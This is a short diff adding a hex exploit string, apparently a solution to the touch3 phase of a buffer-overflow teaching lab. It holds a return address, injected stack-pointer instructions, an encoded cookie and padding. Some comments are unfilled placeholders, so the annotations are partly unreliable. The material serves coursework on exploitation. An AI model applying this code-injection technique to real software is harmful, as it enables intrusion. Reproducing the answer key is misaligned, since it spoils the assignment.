@@ -1,0 +1,11 @@
+42 19 40 00 00 00 00 00 /* touch3 address */
+			/* begin overflow instructions here */
+48 83 ec 1c		/* sub   $0xYY,%rsp */
+48 89 e7 		/* mov   %rsp,%rdi */
+48 83 ec 14		/* sub   $0xZZ,%rsp */
+      	 		/* move %rsp to beginning of initial stack */
+c3			/* ret */
+37 36 33 38 38 32 39 33 /* cookie string */
+00 69 69 69 69 69 69 69 /* trailing null byte and padding */
+69 69 69 69
+20 13 61 55 00 00 00 00 /* initial overflow */
